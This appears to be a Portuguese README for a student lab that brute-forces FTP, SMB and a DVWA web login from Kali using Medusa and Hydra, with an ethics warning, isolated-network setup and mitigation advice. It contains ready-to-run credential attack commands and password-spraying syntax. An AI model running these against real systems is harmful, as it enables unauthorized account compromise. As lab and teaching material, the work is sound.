# Medusa Lab — Kali + Metasploitable2 (VirtualBox)

**Projeto:** Laboratório de força bruta e password spraying usando Medusa (Kali) contra VMs vulneráveis (Metasploitable2 / DVWA).

**Autor:** João Paulo

---

## Conteúdo deste pacote
- `README.md` — este arquivo (detalhado).
- `run_all_tests.sh` — script para executar testes automatizados (FTP, SMB, DVWA/Hydra) e coletar logs.
- `users.txt` — wordlist de usuários de exemplo.
- `passwords.txt` — wordlist de senhas de exemplo.
- `Relatorio_Medusa_Lab.docx` — relatório Word gerado anteriormente.

---

## Aviso legal e ética
Este material é **apenas para uso em ambiente de laboratório controlado**. Não execute esses testes em sistemas que você não possui ou não tem autorização explícita para testar. Uso indevido é ilegal e antiético.

---

## Pré-requisitos
- Host com VirtualBox (versão recomendada 6.x/7.x).
- ISOs/VMs: Kali Linux (atacante) e Metasploitable2 (alvo). DVWA opcional.
- Kali atualizado e com ferramentas instaladas (medusa, hydra, enum4linux, smbclient, smbmap, tcpdump).

Instalação rápida no Kali:
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install medusa hydra enum4linux smbclient smbmap net-tools tcpdump -y
```

---

## Rede recomendada
Use **Host-Only** ou **Internal Network** no VirtualBox para isolar o laboratório. Exemplo de rede: `192.168.56.0/24`.

IPs de exemplo:
- Kali: `192.168.56.100`
- Metasploitable2: `192.168.56.101`
- DVWA (se separado): `192.168.56.102`

---

## Arquivos de wordlist (exemplos)
- `users.txt` — lista curta de usuários comuns.
- `passwords.txt` — lista curta de senhas fracas para teste.

> Substitua por wordlists maiores (ex: `rockyou.txt`, SecLists) apenas em laboratório — grandes wordlists geram muito tráfego e podem travar alvos.

---

## Scripts
### run_all_tests.sh
Local: `run_all_tests.sh`
Descrição: executa Medusa para FTP e SMB e Hydra para DVWA, salvando saídas e gerando hashes dos logs.

Uso:
1. Coloque o script em `/home/kali/` (ou qualquer diretório) e torne executável:
```bash
chmod +x run_all_tests.sh
```
2. Edite variáveis no topo do script (TARGET_FTP, TARGET_SMB, TARGET_DVWA, caminhos de wordlists).
3. Execute:
```bash
./run_all_tests.sh
```

---

## Exemplos de comandos (copiar/colar)
### Medusa — FTP (usuário único)
```bash
medusa -h 192.168.56.101 -u ftp -P /home/kali/wordlists/passwords.txt -M ftp -T 8 -f -O /home/kali/medusa_ftp_results.txt
```

### Medusa — FTP (lista de usuários)
```bash
medusa -M ftp -h 192.168.56.101 -U /home/kali/wordlists/users.txt -P /home/kali/wordlists/passwords.txt -T 6 -O /home/kali/medusa_ftp_multi.txt
```

### Hydra — DVWA (web form)
```bash
hydra -L /home/kali/wordlists/users.txt -P /home/kali/wordlists/passwords.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect" -t 8 -V -w 5
```

### Medusa — SMB (password spraying)
```bash
medusa -M smbnt -h 192.168.56.101 -U /home/kali/wordlists/users.txt -P /home/kali/wordlists/passwords.txt -T 8 -O /home/kali/medusa_smb_results.txt
```

---

## Coleta de evidências
- Use `-O` no Medusa para salvar saída.
- Capture tráfego com tcpdump:
```bash
sudo tcpdump -i any host 192.168.56.101 -w /home/kali/capturas/capture.pcap
```
- Gere checksums dos logs:
```bash
sha256sum /home/kali/medusa_*.txt > /home/kali/log_hashes.sha256
```

---

## Recomendações rápidas de mitigação
- Senhas fortes e políticas de rotação.
- Rate limiting / account lockout.
- MFA onde possível.
- Usar SFTP/FTPS em vez de FTP.
- Monitoramento e alertas (fail2ban, IDS).

---

## Como personalizar
1. Edite as wordlists em `users.txt` e `passwords.txt`.
2. Ajuste `run_all_tests.sh` para seus IPs e caminhos.
3. Para testes maiores, use `rockyou.txt` ou SecLists em `/usr/share/wordlists/`.

---

## Nota final
Mantenha logs e evidências organizados. Ao produzir seu relatório final, inclua evidências (saídas, pcap, screenshots) e as recomendações de mitigação.


